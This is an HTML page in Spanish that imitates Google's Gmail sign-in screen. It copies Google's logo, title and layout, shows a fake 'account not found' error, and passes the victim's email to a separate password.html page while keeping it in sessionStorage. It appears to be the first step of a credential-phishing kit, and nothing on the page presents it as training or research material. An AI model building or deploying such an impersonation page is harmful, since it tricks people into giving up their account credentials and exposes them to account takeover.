<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='10' fill='%234285F4'/%3E%3C/svg%3E">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background: #fff; display: flex; flex-direction: column; min-height: 100vh; }
        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
        .card { width: 100%; max-width: 450px; padding: 48px 40px 36px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo svg { width: 75px; height: 75px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
        .subtitle { font-size: 16px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 32px; }
        .error-box { background: #fce8e6; border-radius: 8px; padding: 12px; margin-bottom: 24px; display: none; color: #c5221f; font-size: 14px; }
        .error-box.show { display: block; }
        .input-field { margin-bottom: 24px; position: relative; }
        .input-field input { width: 100%; padding: 16px 16px 8px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; background: transparent; }
        .input-field input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .input-field label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #5f6368; font-size: 16px; transition: all 0.2s; pointer-events: none; background: white; padding: 0 4px; }
        .input-field input:focus + label, .input-field input:not(:placeholder-shown) + label { top: 0; font-size: 12px; color: #1a73e8; }
        .input-field input::placeholder { opacity: 0; }
        .forgot { margin: 8px 0 48px; }
        .forgot a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .guest { margin: 16px 0 32px; color: #5f6368; font-size: 14px; line-height: 1.5; }
        .guest a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .actions { display: flex; align-items: center; justify-content: space-between; }
        .create { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; padding: 8px 12px; border-radius: 4px; }
        .create:hover { background: rgba(26,115,232,0.04); }
        .next-btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next-btn:hover { background: #1557b0; }
        .footer { padding: 16px 24px; border-top: 1px solid #dadce0; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
        .footer select { border: none; background: transparent; color: #5f6368; font-size: 12px; }
        .footer-links { display: flex; gap: 24px; }
        .footer-links a { color: #5f6368; text-decoration: none; }
        @media (max-width: 480px) { .card { padding: 24px 16px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <!-- Logo Google (G de colores) -->
            <div class="logo">
                <svg viewBox="0 0 24 24" width="75" height="75">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
            </div>
            <h1>Iniciar sesión</h1>
            <p class="subtitle">para continuar en Gmail</p>
            
            <div class="error-box" id="errorBox">⚠️ No se ha podido encontrar tu cuenta de Google</div>
            
            <form action="password.html" method="GET" id="emailForm">
                <div class="input-field">
                    <input type="email" name="email" id="emailInput" placeholder=" " required autofocus>
                    <label>Correo electrónico o teléfono</label>
                </div>
                <div class="forgot"><a href="recovery.html">¿Olvidaste el correo electrónico?</a></div>
                <div class="guest">¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#">Más información</a></div>
                <div class="actions">
                    <a href="#" class="create">Crear cuenta</a>
                    <button type="submit" class="next-btn">Siguiente</button>
                </div>
            </form>
        </div>
    </div>
    <footer class="footer">
        <select><option>Español (España)</option><option>English (US)</option></select>
        <div class="footer-links"><a href="#">Ayuda</a><a href="#">Privacidad</a><a href="#">Términos</a></div>
    </footer>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        if(urlParams.get('error')==='1'){ document.getElementById('errorBox').classList.add('show'); const e=urlParams.get('email'); if(e) document.getElementById('emailInput').value=decodeURIComponent(e); }
        const stored = sessionStorage.getItem('gml_email'); if(stored && !urlParams.get('email')) document.getElementById('emailInput').value = stored;
        document.getElementById('emailForm').addEventListener('submit', function(){ sessionStorage.setItem('gml_email', document.getElementById('emailInput').value); });
    </script>
</body>
</html>
